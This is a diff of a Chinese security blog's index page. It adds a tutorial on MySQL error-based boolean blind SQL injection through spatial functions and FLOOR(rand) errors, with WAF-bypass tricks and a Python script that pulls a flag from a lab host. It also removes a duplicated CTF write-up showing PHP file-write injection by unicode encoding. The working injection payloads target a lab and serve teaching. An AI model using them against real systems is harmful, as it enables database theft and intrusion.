@@ -207,6 +207,215 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/spatial_functions_blind_inject.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/spatial_functions_blind_inject.html" class="post-title-link" itemprop="url">一种基于运行错误的Bool型盲注原理剖析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-17 09:22:09 / 修改时间：09:22:18" itemprop="dateCreated datePublished" datetime="2021-03-17T09:22:09+08:00">2021-03-17</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="一种基于运行错误的Bool型盲注原理剖析"><a href="#一种基于运行错误的Bool型盲注原理剖析" class="headerlink" title="一种基于运行错误的Bool型盲注原理剖析"></a>一种基于运行错误的Bool型盲注原理剖析</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>文章首发于<strong>i春秋</strong></p>
+<p>老规矩，我已经将靶机封装到Docker镜像中供各位观众姥爷们食用。</p>
+<pre><code>靶机Docker镜像：gqleung/spatial_functions_blind_inject</code></pre><p>什么是<code>基于运行错误的Bool型盲注</code>？</p>
+<p>简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通过MYSQL解释器的预检查却在运行时候出现错误的SQL函数。</p>
+<h4 id="Spatial-Functions"><a href="#Spatial-Functions" class="headerlink" title="Spatial Functions"></a><span id="spatial">Spatial Functions</span></h4><p><code>ST_GeomFromText</code>、<code>ST_MPointFromText</code>是两个可以从<code>文本</code>中解析Spatial function的函数，如果我们的语法各方面都复合mysql的规则，如果我们在解析文本中做手脚呢？MYSQL解释器不会检查一个字符串是否复合MYSQL语法要求，很明显这样我们就可以绕过MYSQL预检查，但是在运行时候又「恰逢其时」地出错，这样我们就可以进行Bool盲注了。需要注意的是<code>ST_GeomFromText</code>针对的是<code>POINT()</code>函数，<code>ST_MPointFromText</code>针对的是<code>MULTIPOINT()</code>函数的。</p>
+<p>以<code>ST_GeomFromText</code>为例：</p>
+<p>例如构造如下SQL语句,很明显POINT函数传入的必须是GIS中的地理坐标的数据类型，这里写入的是一个常量或者undefined类型，但是他却能正常运行。</p>
+<pre><code class="MYSQL">mysql&gt; SELECT IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
++---------------------------------------------------+
+| IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0) |
++---------------------------------------------------+
+|                                                 0 |
++---------------------------------------------------+
+1 row in set (0.00 sec)</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-011441@2x.png" alt="WX20210126-011441@2x"></p>
+<p>假设我们将<code>if</code>的表达式改成<code>false</code>呢，很明显会执行中间的参数，POINT的数据类型错误会导致报错。</p>
+<pre><code class="mysql">mysql&gt; SELECT IF(1, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
+ERROR 3037 (22023): Invalid GIS data provided to function st_geometryfromtext.</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-012024@2x.png" alt="WX20210126-012024@2x"></p>
+<ul>
+<li>注意在Mysql5.7.6以上版本 ST_X、ST_GeomFromText已经被弃用，使用<code>ST_GeomFromText(&#39;POINT(mads)&#39;)</code>代替即可</li>
+</ul>
+<p>总结，其他可用的函数：</p>
+<pre><code class="MYSQL">SELECT IF({}, ST_X(ST_GeomFromText(&#39;POINT(mads)&#39;)), 0);
+SELECT IF({}, ST_MPointFromText(&#39;MULTIPOINT (mads)&#39;),0);
+SELECT IF({}, ST_X(MADS), 0);
+SELECT IF({}, ST_MPointFromText(&#39;MADS&#39;),0);
+SELECT IF({}, ST_GeomFromText(&#39;MADS&#39;),0);</code></pre>
+<p>我们再来看我们的靶机<code>(Docker镜像：gqleung/tmd_sz_fsl)</code></p>
+<p>经过fuzz可以发现这个靶机不论参数传递数字都是会返回同一张图，但是如果存在被ban掉的字符会返回如下图：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-014859@2x.png" alt="WX20210126-014859@2x"></p>
+<p>我们可以借此FUZZ出被ban掉的关键字：</p>
+<pre><code class="MYSQL">union、*、&#39;、&quot;、substr、mid、=、like、into、file、sleep、benchmark、 、^、or、、、、&amp;、&gt;、&lt;、#、-、ascii、ord、floor、extractvalue、updatexml、if、rp、rep、GET_LOCK、info</code></pre>
+<ul>
+<li><p>这里过滤了空格，这里可以直接用<code>\t</code>来代替空格，URL编码后是%09,在写脚本时候可以使用TAB键来代替。</p>
+</li>
+<li><p>过滤了单双引号，可以使用十六进制来代替字符串。</p>
+</li>
+<li><p>过滤了<code>if</code>可以使用<code>case when....then....else...end</code>代替</p>
+</li>
+<li><p>过滤了等于号、大于、小于、减号、like、我们可以使用正则表达式来判断也就是regexp</p>
+</li>
+</ul>
+<p>我们通过上面所讲解的<code>ST_GeomFromText</code>,结合上述过滤考点，构造如下payload,当然空格要用%09代替。</p>
+<pre><code>index.php?cat=1%09and%09IF(0,ST_X(ST_GeomFromText(0x504F494E54286D61647329)),0)</code></pre><p>如果if表达式为false可以发现返回正常的页面：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-020116@2x.png" alt="WX20210126-020116@2x"></p>
+<p>若if表达式为true,那么将会返回运行错误的页面：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-020240@2x.png" alt="WX20210126-020240@2x"></p>
+<p>据此编写Python脚本：</p>
+<pre><code class="PYTHON">#author：Gqleung
+#Email:  admin@plasf.cn
+#blog:   http://www.plasf.cn
+
+import requests
+
+def ord2hex(string):
+    result = &quot;&quot;
+    for i in string:
+        r = hex(ord(i));
+        r = r.replace(&#39;0x&#39;,&#39;&#39;)
+        result = result+r
+    return &#39;0x&#39;+result
+
+url = &quot;http://47.98.234.232:28076/index.php?cat=&quot;
+tables = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-}{&#39;
+result=&quot;&quot;
+for i in range(1,70):
+    for j in tables:
+        if j ==&quot;{&quot; or j==&quot;}&quot;:
+            j=&#39;\\&#39;+j
+        payload = &quot;1    and    IF((select    flag    from    flag)    regexp    binary    %s,    ST_X(ST_GeomFromText(0x504F494E54286D61647329)),    0)&quot;%(ord2hex(&quot;^&quot;+result+j))
+        r = requests.get(url+payload);
+        if &#39;cat&#39; not in r.text:
+            result=result+j
+            print(result.replace(&#39;\\&#39;,&#39;&#39;))
+            break</code></pre>
+<p>运行结果：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-021628@2x.png" alt="WX20210126-021628@2x"></p>
+<h4 id="FLOOR-X"><a href="#FLOOR-X" class="headerlink" title="FLOOR(X)"></a>FLOOR(X)</h4><p>咱们先了解<a href="#floor">主键重复报错注入</a>的原理</p>
+<h4 id="主键重复报错注入"><a href="#主键重复报错注入" class="headerlink" title="主键重复报错注入"></a>主键重复报错注入</h4><h5 id="FLOOR-X-1"><a href="#FLOOR-X-1" class="headerlink" title="FLOOR(X)"></a><span id="floor">FLOOR(X)</span></h5><p>该函数返回X的最大整数值，但不能大于X，也就是向下取整。</p>
+<p>例如,下列语句5.20返回的值将会是5.</p>
+<pre><code class="mysql">select floor(5.20)</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-083818@2x.png" alt="WX20201225-083818@2x"></p>
+<p>我们先来看Payload再来分析其中的原理</p>
+<pre><code class="mysql">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</code></pre>
+<ul>
+<li>Q1为什么用<code>floor(rand(0)*2)</code>?</li>
+</ul>
+<p>要回答这个问题，必须从floor报错注入的原理理解：</p>
+<p>例如，user()中含有五条数据：</p>
+<pre><code class="mysql">select rand() from user</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-093334@2x.png" alt="WX20201225-093334@2x"></p>
+<p>可以发现会随机生成小于0的随机数。当然<code>rand()*2</code>生成<code>0-1</code>的随机数</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-093851@2x.png" alt="WX20201225-093851@2x"></p>
+<p>加上floor就是取整。会生成0或者1的随机值：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094006@2x.png" alt="WX20201225-094006@2x"></p>
+<p>但是为什么用rand(0)呢？</p>
+<p>Rand()两次运行的结果，可以明显地看到rand()产生的结果是随机的。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094117@2x.png" alt="WX20201225-094117@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094710@2x.png" alt="WX20201225-094710@2x"></p>
+<p>Rand(0)两次运行的结果，可以发现两次运行的结果完全一致，说明<code>rand(0)</code>是伪随机的。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png" alt="WX20201225-094830@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png" alt="WX20201225-094830@2x"></p>
+<p>我们再来了解一下<code>group by</code> 的运作过程。</p>
+<blockquote>
+<p>GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。</p>
+</blockquote>
+<p>例如:如下SQL语句：</p>
+<pre><code class="mysql">select id as &quot;number&quot;, contents as &quot;内容&quot; from cat group by number</code></pre>
+<p>执行该sql语句会生成一个新的虚拟表，group by 即指定虚拟表中的对应字段来作为主键。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210120-131144@2x.png" alt="WX20210120-131144@2x"></p>
+<p>我们知道主键只能是唯一的，如果主键出现重复的情况就会发生报错，将重复的主键输出在报错信息中，我们回过头来看报错注入的Payload.</p>
+<pre><code class="mysql">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</code></pre>
+<p>我们看到这里以x 为主键,<code>rand(0)*2</code>生成0-2之间的伪随机数，同时使用<code>floor</code>来取整，出现的只能是值为0或者1（当然前提是表所存储的记录条数要&gt;3条才有可能重复）。使用<code>concat</code>将要查询的内容拼接入主键，这样在报错时会将咱们想要的内容作为报错信息输出。</p>
+<p>例如：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210120-133637@2x.png" alt="WX20210120-133637@2x"></p>
+<p>注：输出字符长度限制为64个字符</p>
+<p>我们了解完FLOOR（X）报错注入原理后开始从FLOOR(X)报错注入盲注来简述其中的道理，我们直接从payload来看：</p>
+<pre><code class="mysql">select count(*),floor(rand(0)*2)x from cat group by if(1,x,0);</code></pre>
+<p>我们知道floor(rand(0)*2)产生的随机数是伪随机数范围在0-1，如果将其参数的结果作为主键就会造成报错，假设我们用<code>if</code>语句来控制x是否作为主键呢？这就有可能造成不报错的情况，用此来作为报错注入盲注。通常情况与<a href="#spatial">Spatial Functions</a>报错注入盲注类似。</p>
+<pre><code class="mysql">mysql&gt; select count(*),floor(rand(0)*2)x from cat group by if(1,x,0);
+ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;
+mysql&gt; select count(*),floor(rand(0)*2)x from cat group by if(0,x,0);
++----------+---+
+| count(*) | x |
++----------+---+
+|        2 | 0 |
++----------+---+
+1 row in set (0.00 sec)</code></pre>
+<h4 id="数据溢出型"><a href="#数据溢出型" class="headerlink" title="数据溢出型"></a>数据溢出型</h4><p>在报错注入中数据溢出的函数同样可用如下。</p>
+<pre><code class="mysql">mysql&gt; select pow(2,1024);
+ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(2,1024)&#39;
+mysql&gt; select cot(0);
+ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;
+mysql&gt; select exp(710);
+ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</code></pre>
+<p>### </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/desctf12.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1828,7 +2037,7 @@ echo $open_php;
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d611bed02b.html">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/2a808de4a49b19.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/header.jpg">
@@ -1842,7 +2051,7 @@ echo $open_php;
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/articles/d611bed02b.html" class="post-title-link" itemprop="url">西湖论剑Easyjson Write up</a>
+            <a href="/articles/2a808de4a49b19.html" class="post-title-link" itemprop="url">西湖论剑Easyjson Write up</a>
         </h2>
 
         <div class="post-meta">
@@ -1851,24 +2060,9 @@ echo $open_php;
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2020-10-09 14:33:08" itemprop="dateCreated datePublished" datetime="2020-10-09T14:33:08+08:00">2020-10-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:04:36" itemprop="dateModified" datetime="2020-10-14T17:04:36+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
+              <time title="创建时间：2020-10-09 14:33:08 / 修改时间：18:57:51" itemprop="dateCreated datePublished" datetime="2020-10-09T14:33:08+08:00">2020-10-09</time>
             </span>
 
           <br>
@@ -2272,214 +2466,6 @@ f.close()
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/2a808de4a49b19.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/2a808de4a49b19.html" class="post-title-link" itemprop="url">西湖论剑Easyjson Write up</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-10-09 14:33:08 / 修改时间：18:57:51" itemprop="dateCreated datePublished" datetime="2020-10-09T14:33:08+08:00">2020-10-09</time>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>太菜了只做了一道</p>
-</blockquote>
-<h2 id="Easyjson"><a href="#Easyjson" class="headerlink" title="Easyjson"></a>Easyjson</h2><ul>
-<li>代码审计</li>
-</ul>
-<pre><code class="php"> &lt;?php
-include &#39;security.php&#39;;
-
-if(!isset($_GET[&#39;source&#39;])){
-    show_source(__FILE__);
-    die();
-}
-$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
-var_dump($sandbox);
-if(!file_exists($sandbox)){
-    mkdir($sandbox);
-    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
-}
-$action = $_GET[&#39;action&#39;];
-$content = file_get_contents(&quot;php://input&quot;);
-
-
-if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
-    $content = json_decode($content);
-    $filename = $_GET[&#39;filename&#39;];
-    $filecontent = $content-&gt;content;
-    $filename = $sandbox.$filename;
-    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
-}elseif($action == &quot;reset&quot;){
-    $files = scandir($sandbox);
-    foreach($files as $file) {
-        if(!is_dir($file)){
-            if($file !== &quot;index.php&quot;){
-                unlink($sandbox.$file);
-            }
-        }
-    }
-}
-else{
-    die(&#39;Security Check Failed.&#39;);
-}
-</code></pre>
-<ul>
-<li>代码主要部分在,但是这里有一个waf对文件名和content参数进行过滤。简单Fuzz了一下，filename可以使用php后缀，说明可以写php文件，但是有一个很关键的问题就是<code>content</code>它传来必须是一个json,json中有一个属性是content，例如：<code>{&#39;content&#39;:&#39;&lt;?=phpinfo()?&gt;&#39;}</code>但是<code>waf</code>对json进行了过滤，不能存在content这个字符串(还过滤了其他关键字)。</li>
-</ul>
-<pre><code class="php">if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
-    $content = json_decode($content);
-    $filename = $_GET[&#39;filename&#39;];
-    $filecontent = $content-&gt;content;
-    $filename = $sandbox.$filename;
-    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
-}</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png" alt="WX20201009-001234@2x"></p>
-<ul>
-<li>神小密圈发现，json支持的字符中可以支持unicode编码，那么我们全都用unicode编码来代替字符串不就行了？</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG59.jpeg" alt="WechatIMG59"></p>
-<ul>
-<li>简单测试一下发现可以.<a href="https://blog.csdn.net/weixin_30654419/article/details/97554779?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">Unicode表</a></li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG72.png" alt="WechatIMG72"></p>
-<ul>
-<li>简单写个脚本来将字符串转化为unicode编码。</li>
-</ul>
-<pre><code class="php">&lt;?php
-
-function unicode_encode($str){
-    $table = [
-            &#39;\u002&#39;=&gt;[&#39; &#39;,&#39;!&#39;,&#39;&quot;&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;&amp;&#39;,&#39;\&#39;&#39;,&#39;(&#39;,&#39;)&#39;,&#39;*&#39;,&#39;+&#39;,&#39;,&#39;,&#39;-&#39;,&#39;.&#39;,&#39;/&#39;],
-            &#39;\u003&#39;=&gt;[&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;:&#39;,&#39;;&#39;,&#39;&lt;&#39;,&#39;=&#39;,&#39;&gt;&#39;,&#39;?&#39;],
-            &#39;\u004&#39;=&gt;[&#39;@&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;],
-            &#39;\u005&#39;=&gt;[&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;[&#39;,&#39;\\&#39;,&#39;]&#39;,&#39;^&#39;,&#39;_&#39;],
-            &#39;\u006&#39;=&gt;[&#39;`&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;],
-            &#39;\u007&#39;=&gt;[&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;{&#39;,&#39;|&#39;,&#39;}&#39;,&#39;~&#39;]
-];
-    foreach ($table as $key =&gt; $value) {
-        $i = 0;
-        foreach ($value as $vcode) {
-            $i=$i+1;
-            if($str==$vcode){
-                return $key.bin2e($i-1);
-            }
-
-        }
-    }
-
-}
-
-function bin2e($str){
-    switch ($str) {
-        case &#39;10&#39;:
-            return &#39;a&#39;;
-            break;
-        case &#39;11&#39;:
-            return &#39;b&#39;;
-            break;
-        case &#39;12&#39;:
-            return &#39;c&#39;;
-            break;
-        case &#39;13&#39;:
-            return &#39;d&#39;;
-            break;
-        case &#39;14&#39;:
-            return &#39;e&#39;;
-            break;
-        case &#39;15&#39;:
-            return &#39;f&#39;;
-            break;
-        default:
-            return $str;
-            break;
-    }
-}
-
-function main($str){
-for($i=0;$i&lt;strlen($str);$i++){
-    echo unicode_encode($str[$i]);
-}
-}
-
-
-main(&#39;&lt;?=phpinfo()?&gt;&#39;);
-?&gt;</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000458@2x.png" alt="WX20201009-000458@2x"></p>
-<ul>
-<li>EXP</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000600@2x.png" alt="WX20201009-000600@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000806@2x.png" alt="WX20201009-000806@2x"></p>
-<ul>
-<li>Getflag</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001124@2x.png" alt="WX20201009-001124@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001031@2x.png" alt></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000938@2x.png" alt="WX20201009-000938@2x"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2551,7 +2537,7 @@ main(&#39;&lt;?=phpinfo()?&gt;&#39;);
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-count">69</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2564,7 +2550,7 @@ main(&#39;&lt;?=phpinfo()?&gt;&#39;);
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -2622,12 +2608,12 @@ main(&#39;&lt;?=phpinfo()?&gt;&#39;);
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">248k</span>
+    <span title="站点总字数">253k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:46</span>
+    <span title="站点阅读时长">3:50</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
